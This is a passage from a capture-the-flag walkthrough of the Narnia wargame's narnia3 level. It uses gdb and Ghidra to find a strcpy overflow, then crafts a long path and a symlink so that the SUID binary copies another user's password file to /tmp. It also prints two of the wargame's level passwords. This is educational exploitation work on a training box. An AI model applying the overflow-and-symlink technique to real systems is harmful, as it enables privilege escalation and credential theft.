&nbsp; &nbsp; &nbsp;<br> &nbsp; 0x0804860a &lt;+255&gt;: &nbsp; add &nbsp; &nbsp;</span><span class="c12">$0x4</span><span class="c3">,%esp<br> &nbsp; 0x0804860d &lt;+258&gt;: &nbsp; push &nbsp; </span><span class="c12">$0x1</span><span class="c3"><br> &nbsp; 0x0804860f &lt;+260&gt;: &nbsp; call &nbsp; 0x80483b0 &lt;</span><span class="c8">exit</span><span class="c3">@plt&gt;<br>End of assembler dump.<br>(gdb) b *0x0804860d &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<br>Breakpoint 1 at 0x804860d</span></p></td></tr></table><p class="c23"><span class="c2"></span></p><p class="c0"><span class="c2">To determine where the contents of the inputted file will be located, the file a.txt was created (located in /tmp/test6/) whose contents is filled with 300 A&rsquo;s. </span></p><a id="t.dee6eb59d1bb864f71a3d83256c7031f15860a88"></a><a id="t.29"></a><table class="c24"><tr class="c22"><td class="c18" colspan="1" rowspan="1"><p class="c19"><span class="c3">(gdb) r /tmp/test6/a.txt &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<br>Starting program: /narnia/narnia3 /tmp/test6/a.txt &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<br>copied contents of /tmp/test6/a.txt to a safer place... (/dev/null) &nbsp; &nbsp; &nbsp; <br> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<br>Breakpoint 1, 0x0804860d </span><span class="c6">in</span><span class="c3">&nbsp;main () &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; </span></p></td></tr></table><p class="c23"><span class="c2"></span></p><p class="c0"><span>Viewing the esp register reveals that this string of A&rsquo;s starts at </span><span class="c3">0xffffd560</span><span class="c2">. </span></p><a id="t.b6ef42f3a7710e6996c584d5e7b5f5613029e67a"></a><a id="t.30"></a><table class="c24"><tr class="c22"><td class="c18" colspan="1" rowspan="1"><p class="c19"><span class="c3">(gdb) x/100x </span><span class="c12">$esp</span><span class="c3">-100 &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <br>0xffffd4fc: &nbsp; &nbsp; 0xf7fe818a &nbsp; &nbsp; &nbsp;0xf7ffda7c &nbsp; &nbsp; &nbsp;0xf7ffd000 &nbsp; &nbsp; &nbsp;0x0804825c &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<br>0xffffd50c: &nbsp; &nbsp; 0xf7ffd000 &nbsp; &nbsp; &nbsp;0x0804825c &nbsp; &nbsp; &nbsp;0x00000001 &nbsp; &nbsp; &nbsp;0xf7e187b8 &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<br>0xffffd51c: &nbsp; &nbsp; 0xf7e53f7b &nbsp; &nbsp; &nbsp;0xf7e1d068 &nbsp; &nbsp; &nbsp;0x00000002 &nbsp; &nbsp; &nbsp;0xf7fc5000<br>0xffffd52c: &nbsp; &nbsp; 0xf7fe800b &nbsp; &nbsp; &nbsp;0x00000000 &nbsp; &nbsp; &nbsp;0x00000002 &nbsp; &nbsp; &nbsp;0xf7fc5000 &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<br>0xffffd53c: &nbsp; &nbsp; 0xffffd5b8 &nbsp; &nbsp; &nbsp;0xf7fee710 &nbsp; &nbsp; &nbsp;0xf7fc6870 &nbsp; &nbsp; &nbsp;0xffffd5b8 &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<br>0xffffd54c: &nbsp; &nbsp; 0x00000000 &nbsp; &nbsp; &nbsp;0x7fffffbd &nbsp; &nbsp; &nbsp;0xf7ee930c &nbsp; &nbsp; &nbsp;0x0804860a<br>0xffffd55c: &nbsp; &nbsp; 0x00000003 &nbsp; &nbsp; &nbsp;0x41414141 &nbsp; &nbsp; &nbsp;0x41414141 &nbsp; &nbsp; &nbsp;0x41414141 &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<br>0xffffd56c: &nbsp; &nbsp; 0x41414141 &nbsp; &nbsp; &nbsp;0x41414141 &nbsp; &nbsp; &nbsp;0x41414141 &nbsp; &nbsp; &nbsp;0x41414141 &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<br>0xffffd57c: &nbsp; &nbsp; 0x00414141 &nbsp; &nbsp; &nbsp;0x706d742f &nbsp; &nbsp; &nbsp;0x7365742f &nbsp; &nbsp; &nbsp;0x612f3674 &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;</span></p></td></tr></table><p class="c23"><span class="c2"></span></p><p class="c0"><span>Therefore, when the </span><span class="c27">/etc/narnia_pass/narnia3</span><span>&nbsp;file is inputted, we can expect the contents of the file to be around </span><span class="c3">0xffffd560</span><span>.</span></p><a id="t.60926c2590d29003db69f2e15425fecf542e3bf9"></a><a id="t.31"></a><table class="c24"><tr class="c22"><td class="c18" colspan="1" rowspan="1"><p class="c19"><span class="c3 c45">(gdb) r /etc/narnia_pass/narnia3</span></p><p class="c19"><span class="c3 c45">The program being debugged has been started already.</span></p><p class="c19"><span class="c3 c45">Start it from the beginning? (y or n) y</span></p><p class="c19"><span class="c3 c45">Starting program: /narnia/narnia3 /etc/narnia_pass/narnia3</span></p><p class="c19"><span class="c3 c45">copied contents of /etc/narnia_pass/narnia3 to a safer place... (/dev/null)</span></p><p class="c7"><span class="c3 c45"></span></p><p class="c19"><span class="c3 c45">Breakpoint 1, 0x0804860d in main ()</span></p><p class="c7"><span class="c3 c45"></span></p><p class="c7"><span class="c3 c45"></span></p><p class="c19"><span class="c3">(gdb) x/100x </span><span class="c12">$esp</span><span class="c3">-100<br>0xffffd4fc: &nbsp; &nbsp; 0xf7fe818a &nbsp; &nbsp; &nbsp;0xf7ffda7c &nbsp; &nbsp; &nbsp;0xf7ffd000 &nbsp; &nbsp; &nbsp;0x0804825c<br>0xffffd50c: &nbsp; &nbsp; 0xf7ffd000 &nbsp; &nbsp; &nbsp;0x0804825c &nbsp; &nbsp; &nbsp;0x00000001 &nbsp; &nbsp; &nbsp;0xf7e187b8<br>0xffffd51c: &nbsp; &nbsp; 0xf7e53f7b &nbsp; &nbsp; &nbsp;0xf7e1d068 &nbsp; &nbsp; &nbsp;0x00000002 &nbsp; &nbsp; &nbsp;0xf7fc5000<br>0xffffd52c: &nbsp; &nbsp; 0xf7fe800b &nbsp; &nbsp; &nbsp;0x00000000 &nbsp; &nbsp; &nbsp;0x00000002 &nbsp; &nbsp; &nbsp;0xf7fc5000<br>0xffffd53c: &nbsp; &nbsp; 0xffffd5b8 &nbsp; &nbsp; &nbsp;0xf7fee710 &nbsp; &nbsp; &nbsp;0xf7fc6870 &nbsp; &nbsp; &nbsp;0xffffd5b8<br>0xffffd54c: &nbsp; &nbsp; 0x00000000 &nbsp; &nbsp; &nbsp;0x7fffffb5 &nbsp; &nbsp; &nbsp;0xf7ee930c &nbsp; &nbsp; &nbsp;0x0804860a<br>0xffffd55c: &nbsp; &nbsp; 0x00000003 &nbsp; &nbsp; &nbsp;0x71656176 &nbsp; &nbsp; &nbsp;0x7a656575 &nbsp; &nbsp; &nbsp;0xf70a6565<br>0xffffd56c: &nbsp; &nbsp; 0xf7fd2e28 &nbsp; &nbsp; &nbsp;0xf7fc5000 &nbsp; &nbsp; &nbsp;0xffffd654 &nbsp; &nbsp; &nbsp;0xf7ffcd00<br>0xffffd57c: &nbsp; &nbsp; 0x00200000 &nbsp; &nbsp; &nbsp;0x6374652f &nbsp; &nbsp; &nbsp;0x72616e2f &nbsp; &nbsp; &nbsp;0x5f61696e<br>0xffffd58c: &nbsp; &nbsp; 0x73736170 &nbsp; &nbsp; &nbsp;0x72616e2f &nbsp; &nbsp; &nbsp;0x3361696e &nbsp; &nbsp; &nbsp;0xffffd600</span></p></td></tr></table><p class="c23"><span class="c2"></span></p><p class="c0"><span>Looking at the output, we can see that the address of the contents of the file matches the expected location of </span><span class="c3">0xffffd560</span><span>. The contents of the file are read from right to left in memory (as this is in little endian), and are stored using their respective ascii values in hex. Converting this to ascii reveals that this password is vaequeezee, which matches the password of narnia3. However, attempting this same methodology on </span><span class="c27">/etc/narnia_pass/narnia4</span><span class="c2">&nbsp;does not work:</span></p><a id="t.5c92ab69c19eb299045d3973dcaeb084473e14cd"></a><a id="t.32"></a><table class="c24"><tr class="c22"><td class="c18" colspan="1" rowspan="1"><p class="c19"><span class="c3">(gdb) r /etc/narnia_pass/narnia4<br>Starting program: /narnia/narnia3 /etc/narnia_pass/narnia4<br>error opening /etc/narnia_pass/narnia4<br>[Inferior 1 (process 26687) exited with code 0377]</span></p></td></tr></table><h4 class="c21" id="h.uwcd8r4kpbx9"><span class="c16">Security Behind SUID Debugging</span></h4><p class="c0"><span class="c2">The reason this does not work is due to the security risks involved with allowing a user to execute an SUID binary within a debugger. Essentially, if a user was allowed to execute a binary with permissions of another user, then they could easily modify a program to execute what they would like.</span></p><p class="c0"><span class="c2">Debuggers have to execute the ptrace (process trace) function call to trace a function (this is how debugging programs work). This function prevents execve system calls from elevating privileges on the system, as the privilege elevations flags are ignored, effectively making the user have the same privileges as he or she did before debugging. The only way to execute an SUID binary with the permissions of the effective user, is to run the program as root.</span></p><h3 class="c10" id="h.j60l4ds1ohcj"><span class="c5">Binary Analysis</span></h3><p class="c0"><span class="c2">Seeing as reading the narnia4&rsquo;s password in the memory of the stack pointer was not successful, we can analyze the binary in Ghidra to see how it works and come up with a different methodology for exploitation:</span></p><a id="t.6cd8de409e39b0cc9aa094df38ed8b9e998ac367"></a><a id="t.33"></a><table class="c24"><tr class="c22"><td class="c18" colspan="1" rowspan="1"><p class="c19"><span class="c3">void main(int param_1,undefined4 *param_2)<br><br>{<br> &nbsp;undefined local_5c [</span><span class="c8">32</span><span class="c3">];<br> &nbsp;char local_3c [</span><span class="c8">32</span><span class="c3">];<br> &nbsp;undefined4 local_1c;<br> &nbsp;undefined4 local_18;<br> &nbsp;undefined4 local_14;<br> &nbsp;undefined4 local_10;<br> &nbsp;int local_c;<br> &nbsp;int local_8;<br> &nbsp;<br> &nbsp;local_1c = </span><span class="c8">0</span><span class="c3">x7665642f;<br> &nbsp;local_18 = </span><span class="c8">0</span><span class="c3">x6c756e2f;<br> &nbsp;local_14 = </span><span class="c8">0</span><span class="c3">x6c;<br> &nbsp;local_10 = </span><span class="c8">0</span><span class="c3">;<br> &nbsp;</span><span class="c6">if</span><span class="c3">&nbsp;(param_1 != </span><span class="c8">2</span><span class="c3">) {<br> &nbsp; &nbsp;printf(</span><span class="c11">&quot;usage, %s file, will send contents of file 2 /dev/null\n&quot;</span><span class="c3">,*param_2);<br> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;</span><span class="c12">/* WARNING: Subroutine does not return */</span><span class="c3"><br> &nbsp; &nbsp;</span><span class="c6">exit</span><span class="c3">(-</span><span class="c8">1</span><span class="c3">);<br> &nbsp;}<br> &nbsp;strcpy(local_3c,(char *)param_2[</span><span class="c8">1</span><span class="c3">]);<br> &nbsp;local_8 = open((char *)&amp;local_1c,</span><span class="c8">2</span><span class="c3">);<br> &nbsp;</span><span class="c6">if</span><span class="c3">&nbsp;(local_8 &lt; </span><span class="c8">0</span><span class="c3">) {<br> &nbsp; &nbsp;printf(</span><span class="c11">&quot;error opening %s\n&quot;</span><span class="c3">,&amp;local_1c);<br> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;</span><span class="c12">/* WARNING: Subroutine does not return */</span><span class="c3"><br> &nbsp; &nbsp;</span><span class="c6">exit</span><span class="c3">(-</span><span class="c8">1</span><span class="c3">);<br> &nbsp;}<br> &nbsp;local_c = open(local_3c,</span><span class="c8">0</span><span class="c3">);<br> &nbsp;</span><span class="c6">if</span><span class="c3">&nbsp;(local_c &lt; </span><span class="c8">0</span><span class="c3">) {<br> &nbsp; &nbsp;printf(</span><span class="c11">&quot;error opening %s\n&quot;</span><span class="c3">,local_3c);<br> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;</span><span class="c12">/* WARNING: Subroutine does not return */</span><span class="c3"><br> &nbsp; &nbsp;</span><span class="c6">exit</span><span class="c3">(-</span><span class="c8">1</span><span class="c3">);<br> &nbsp;}<br> &nbsp;read(local_c,local_5c,</span><span class="c8">0</span><span class="c3">x1f);<br> &nbsp;write(local_8,local_5c,</span><span class="c8">0</span><span class="c3">x1f);<br> &nbsp;printf(</span><span class="c11">&quot;copied contents of %s to a safer place... (%s)\n&quot;</span><span class="c3">,local_3c,&amp;local_1c);<br> &nbsp;close(local_c);<br> &nbsp;close(local_8);<br> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;</span><span class="c12">/* WARNING: Subroutine does not return */</span><span class="c3"><br> &nbsp;</span><span class="c6">exit</span><span class="c3">(</span><span class="c8">1</span><span class="c3">);<br>}</span></p></td></tr></table><p class="c23"><span class="c2"></span></p><p class="c0"><span class="c2">We can see that the binary is providing 32 bytes to two different unidentified buffers defined as local_5c and local_3c. The program checks if an argument is sent. If not it will provide the usage, otherwise it will perform the strcpy function (a function used to copy strings). This is a dangerous function which can result in buffer overflows. Reading the man page of this function and going to the &ldquo;Bugs&rdquo; section, the following description can be read:</span></p><a id="t.77ac1b1695bc1d00d3296eecaff815a3245c888e"></a><a id="t.34"></a><table class="c24"><tr class="c22"><td class="c71" colspan="1" rowspan="1"><p class="c19"><span class="c60 c49">If the destination string of a strcpy() is not large enough, then anything might happen. Overflowing fixed-length string buffers is a favorite cracker technique for taking complete control of the machine. Any time a program reads or copies data into a buffer, the program first needs to check that there&#39;s enough space. This may be unnecessary if you can show that overflow is impossible, but be careful: programs can get changed over time, in ways that may make the impossible possible.</span></p></td></tr></table><p class="c23"><span class="c2"></span></p><p class="c0"><span class="c2">Following the strcpy function are two if statements: one for checking if a file exists, and another for checking if we have valid permissions for opening the file. If the file exists and we have permissions for opening the file, then the read and write functions are executed.</span></p><p class="c0 c29"><span class="c2"></span></p><p class="c0"><span class="c2">Before figuring out how to exploit the binary, we should first understand how it behaves by doing what the program expects:</span></p><a id="t.7cb3cb091011284f89c64b62f0495f375b236daf"></a><a id="t.35"></a><table class="c24"><tr class="c22"><td class="c18" colspan="1" rowspan="1"><p class="c19"><span class="c3">narnia3@narnia:~$ /narnia/narnia3 /etc/narnia_pass/narnia4<br>copied contents of /etc/narnia_pass/narnia4 to a safer place... (/dev/null)</span></p></td></tr></table><p class="c23"><span class="c2"></span></p><p class="c0"><span class="c2">The program can read the narnia4 password file and copy it to /dev/null. However, due to this being the place in linux used for discarding data, we cannot recover the password. </span></p><h3 class="c10" id="h.koxo6w7ztt2h"><span class="c5">Exploiting strcpy</span></h3><p class="c0"><span class="c2">Going back to Ghidra, we can see that the /dev/null device is set to the variable local_1c:</span></p><p class="c0"><span style="overflow: hidden; display: inline-block; margin: 0.00px 0.00px; border: 0.00px solid #000000; transform: rotate(0.00rad) translateZ(0px); -webkit-transform: rotate(0.00rad) translateZ(0px); width: 549.00px; height: 16.00px;"><img alt="" src="images/image10.png" style="width: 549.00px; height: 16.00px; margin-left: 0.00px; margin-top: 0.00px; transform: rotate(0.00rad) translateZ(0px); -webkit-transform: rotate(0.00rad) translateZ(0px);" title=""></span></p><p class="c0"><span class="c2">If there is a buffer overflow vulnerability we can possibly overwrite this local variable. When inputting many strings followed by the word &ldquo;test&rdquo;, we can see that the program returns an error for opening the program, however not all of the A&rsquo;s that we sent are outputted.</span></p><a id="t.985dccd96882c87648909b068cd5008122835c27"></a><a id="t.36"></a><table class="c24"><tr class="c22"><td class="c18" colspan="1" rowspan="1"><p class="c19"><span class="c3">narnia3@narnia:~$ /narnia/narnia3 AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAtest<br></span><span class="c6">error </span><span class="c3">opening AAAAAAAAAAAAtest</span></p></td></tr></table><p class="c26"><span class="c2"></span></p><p class="c19"><span>We can try to create a file called </span><span class="c3">AAAAAAAAAAAAtest</span><span class="c2">&nbsp;and see how the binary responds.</span></p><a id="t.2e388d4f0a5bf2201c3e85ca795823b4e90ed9f1"></a><a id="t.37"></a><table class="c24"><tr class="c22"><td class="c18" colspan="1" rowspan="1"><p class="c19"><span class="c3">narnia3</span><span class="c12">@narnia</span><span class="c11">:/tmp</span><span class="c12">$ </span><span class="c3">touch AAAAAAAAAAAAtest<br>narnia3</span><span class="c12">@narnia</span><span class="c11">:/tmp</span><span class="c12">$ </span><span class="c3">chmod </span><span class="c8">777</span><span class="c3">&nbsp;AAAAAAAAAAAAtest<br>narnia3</span><span class="c12">@narnia</span><span class="c11">:/tmp</span><span class="c12">$ </span><span class="c3">/narnia/narnia3 AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAtest &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <br>error opening AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAtest</span></p></td></tr></table><p class="c7"><span class="c2"></span></p><p class="c44"><span class="c2">Strangely, the binary now spits out all the A&rsquo;s that we inputted. Recall that we found within Ghidra that 32 bytes are being allocated to two unknown buffers. It is possible that one of the buffers is meant for the name of the input file, while the other buffer is meant for the output. This means that upon creating a long-named directory and inputting the full path of a file located within this directory might successfully overwrite the variable allocated for the /dev/null device. This methodology was carried out as follows: </span></p><a id="t.e85f87763252d02fc1554a2f8ded771d65fe4720"></a><a id="t.38"></a><table class="c24"><tr class="c22"><td class="c18" colspan="1" rowspan="1"><p class="c19"><span class="c3">narnia3</span><span class="c12">@narnia</span><span class="c11">:/tmp</span><span class="c12">$ </span><span class="c3">mkdir </span><span class="c12">$(</span><span class="c3">python -c </span><span class="c11">&quot;print &#39;S&#39;*26&quot;</span><span class="c3">)<br>narnia3</span><span class="c12">@narnia</span><span class="c11">:/tmp</span><span class="c12">$ </span><span class="c3">cd </span><span class="c12">$(</span><span class="c3">python -c </span><span class="c11">&quot;print &#39;S&#39;*26&quot;</span><span class="c3">)<br>narnia3</span><span class="c12">@narnia</span><span class="c11">:/tmp/SSSSSSSSSSSSSSSSSSSSSSSSSS</span><span class="c12">$ </span><span class="c3">touch test<br>narnia3</span><span class="c12">@narnia</span><span class="c11">:/tmp/SSSSSSSSSSSSSSSSSSSSSSSSSS</span><span class="c12">$ </span><span class="c3">chmod </span><span class="c8">777</span><span class="c3">&nbsp;test</span></p></td></tr></table><p class="c19"><span class="c50 c49 c31 c46">Note that a directory of 26 S&rsquo;s was created because /tmp/ is 5 characters and the / at the end of the S directory is one character (6 + 26 = 32 which is the size allocated for the buffer) </span></p><p class="c41 c29"><span class="c2"></span></p><p class="c44"><span class="c2">Executing the full path of the &ldquo;test&rdquo; file within this directory proves to successfully overwrite the null device variable:</span></p><a id="t.a001f61829bfb120c73f5ffa58d7bffefe3de206"></a><a id="t.39"></a><table class="c24"><tr class="c22"><td class="c18" colspan="1" rowspan="1"><p class="c19"><span class="c3">narnia3</span><span class="c12">@narnia</span><span class="c11">:/tmp/SSSSSSSSSSSSSSSSSSSSSSSSS</span><span class="c12">$ </span><span class="c3">/narnia/narnia3 /tmp/SSSSSSSSSSSSSSSSSSSSSSSSSS/test<br>copied contents of /tmp/SSSSSSSSSSSSSSSSSSSSSSSSS/test to a safer place... (test)</span></p></td></tr></table><p class="c26"><span class="c2"></span></p><p class="c44"><span class="c2">It follows that if we create a /tmp directory within the current working directory and create a file that is symbolically linked to narnia4&rsquo;s password file, we can copy his credentials to wherever we specify.</span></p><a id="t.88ed0f4db5abf4e66ff695c175335aa0a479f2c6"></a><a id="t.40"></a><table class="c24"><tr class="c22"><td class="c18" colspan="1" rowspan="1"><p class="c19"><span class="c3">narnia3@narnia:/tmp/SSSSSSSSSSSSSSSSSSSSSSSSSS/tmp$ /narnia/narnia3 /tmp/SSSSSSSSSSSSSSSSSSSSSSSSSS/tmp/credentials<br></span><span class="c6">error </span><span class="c3">opening tmp/credentials</span></p></td></tr></table><p class="c19"><span class="c50 c49 c31 c46">This error was included to further help in understanding how the binary works</span></p><p class="c32 c29"><span class="c2"></span></p><p class="c0"><span class="c2">The error is missing a / at the beginning of the tmp directory. This is because /tmp/ is four characters, S is 26 characters, and the trailing / is one character (which completely fills the 32 bytes allocated for the buffer). Therefore, the string after the trailing / of the S directory is what overwrites the variable for the null device. Creating a directory with 27 S&rsquo;s fixes this problem (note that the choice of S&rsquo;s was arbitrary, and any sequence of 27 bytes within the /tmp directory would have worked):</span></p><a id="t.17cd1c9c4564e6789a9fef1110d722d4c90456cb"></a><a id="t.41"></a><table class="c24"><tr class="c22"><td class="c18" colspan="1" rowspan="1"><p class="c19"><span class="c3">narnia3</span><span class="c12">@narnia</span><span class="c11">:/tmp</span><span class="c12">$ </span><span class="c3">mkdir </span><span class="c12">$(</span><span class="c3">python -c </span><span class="c11">&quot;print &#39;S&#39;*27&quot;</span><span class="c3">)<br>narnia3</span><span class="c12">@narnia</span><span class="c11">:/tmp</span><span class="c12">$ </span><span class="c3">cd </span><span class="c12">$(</span><span class="c3">python -c </span><span class="c11">&quot;print &#39;S&#39;*27&quot;</span><span class="c3">)<br>narnia3</span><span class="c12">@narnia</span><span class="c11">:/tmp/SSSSSSSSSSSSSSSSSSSSSSSSSSS</span><span class="c12">$ </span><span class="c3">mkdir tmp<br>narnia3</span><span class="c12">@narnia</span><span class="c11">:/tmp/SSSSSSSSSSSSSSSSSSSSSSSSSSS</span><span class="c12">$ </span><span class="c3">cd tmp<br>narnia3</span><span class="c12">@narnia</span><span class="c11">:/tmp/SSSSSSSSSSSSSSSSSSSSSSSSSSS/tmp</span><span class="c12">$ </span><span class="c3">ln -s /etc/narnia_pass/narnia4 credentials<br>narnia3</span><span class="c12">@narnia</span><span class="c11">:/tmp/SSSSSSSSSSSSSSSSSSSSSSSSSSS/tmp</span><span class="c12">$ </span><span class="c3">/narnia/narnia3 /tmp/SSSSSSSSSSSSSSSSSSSSSSSSSSS/tmp/credentials<br>error opening /tmp/credentials<br>narnia3</span><span class="c12">@narnia</span><span class="c11">:/tmp/SSSSSSSSSSSSSSSSSSSSSSSSSSS/tmp</span><span class="c12">$ </span><span class="c3">touch /tmp/credentials<br>narnia3</span><span class="c12">@narnia</span><span class="c11">:/tmp/SSSSSSSSSSSSSSSSSSSSSSSSSSS/tmp</span><span class="c12">$ </span><span class="c3">chmod </span><span class="c8">777</span><span class="c3">&nbsp;/tmp/credentials<br>narnia3</span><span class="c12">@narnia</span><span class="c11">:/tmp/SSSSSSSSSSSSSSSSSSSSSSSSSSS/tmp</span><span class="c12">$ </span><span class="c3">/narnia/narnia3 /tmp/SSSSSSSSSSSSSSSSSSSSSSSSSSS/tmp/credentials<br>copied contents of /tmp/SSSSSSSSSSSSSSSSSSSSSSSSSSS/tmp/credentials to a safer place... (</span><span class="c12">/tmp/credentials</span><span class="c3">)<br>narnia3</span><span class="c12">@narnia</span><span class="c11">:/tmp/SSSSSSSSSSSSSSSSSSSSSSSSSSS/tmp</span><span class="c12">$ </span><span class="c3">cat /tmp/credentials<br>thaenohtai</span></p></td></tr></table><p class="c23"><span class="c2"></span></p><p class="c0"><span class="c2">The password for the narnia4 user was successfully copied to the /tmp directory under the filename of credentials.</span></p><h3 class="c10" id="h.65h64uhj8erp"><span class="c5">Source Code</span></h3><a id="t.b53db54adec7cb11a5829dfdb304753b65d26271"></a><a id="t.42"></a><table class="c24"><tr class="c22"><td class="c18" colspan="1" rowspan="1"><p class="c19"><span class="c39">#include &lt;stdio.h&gt;</span><span class="c3"><br></span><span class="c39">#include &lt;sys/types.h&gt;</span><span class="c3"><br></span><span class="c39">#include &lt;sys/stat.h&gt;</span><span class="c3"><br></span><span class="c39">#include &lt;fcntl.h&gt;</span><span class="c3"><br></span><span class="c39">#include &lt;unistd.h&gt;</span><span class="c3"><br></span><span class="c39">#include &lt;stdlib.h&gt; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; </span><span class="c3"><br></span><span class="c39">#include &lt;string.h&gt; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;</span><span class="c3"><br> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <br>int main(int argc, char **argv){<br><br> &nbsp; &nbsp;int &nbsp;ifd, &nbsp;ofd;<br> &nbsp; &nbsp;char ofile[</span><span class="c8">16</span><span class="c3">] = </span><span class="c11">&quot;/dev/null&quot;</span><span class="c3">;<br> &nbsp; &nbsp;char ifile[</span><span class="c8">32</span><span class="c3">];<br> &nbsp; &nbsp;char buf[</span><span class="c8">32</span><span class="c3">];<br><br> &nbsp; &nbsp;</span><span class="c6">if</span><span class="c3">(argc != 